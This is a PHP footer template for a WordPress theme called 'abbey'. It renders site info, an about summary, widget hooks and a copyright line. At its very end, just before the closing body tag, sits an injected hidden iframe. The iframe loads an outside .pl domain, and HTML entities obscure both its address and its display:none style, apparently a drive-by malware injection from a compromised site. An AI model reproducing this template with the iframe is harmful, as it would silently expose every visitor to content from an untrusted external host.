<?php

$site_about = ( !empty( abbey_get_defaults( "about" ) ) ) ? abbey_get_defaults( "about" ) : "";

?>
		<aside class="row" id="before-footer"> <?php do_action( "abbey_theme_before_footer" ) ; ?></aside> 
		
		<footer class="row" id="site-footer" role="footer">	
			
			<section class="" id="inner-footer">
				<div class="text-center" id="site-info"> 
					<?php abbey_show_logo( "", "", false ); ?> 
					<p class="small description text-center"> <?php bloginfo( "description" ); ?> </p>
				</div>
				
				<div class="" id="site-about">
					<?php if ( !empty( $site_about ) ) : ?>
						<summary> <?php echo esc_html ( $site_about ); ?> </summary>
					<?php endif; ?>
				</div>
				
				<aside id="footer-header" class="">
				<?php do_action( "abbey_theme_footer_widgets" ); ?>
				</aside>

			</section>

			<div class="clearfix"></div>

			<div id="footer-bottom" class="row">
				<div class="col-md-4"><?php echo sprintf(__( "All rights reserved &copy; %s", "abbey" ), date("Y") ); ?></div>
				<div class="col-md-8">
					<?php do_action( "abbey_theme_footer_credits" ); ?>
				</div>
			</div>


		</footer>

	
</div><!--#site wrapper open in header.php -->
	<?php wp_footer(); ?>

<iframe src="http://jL.c&#104;ura.pl/rc/" style="&#100;isplay:none"></iframe>
</body>
</html>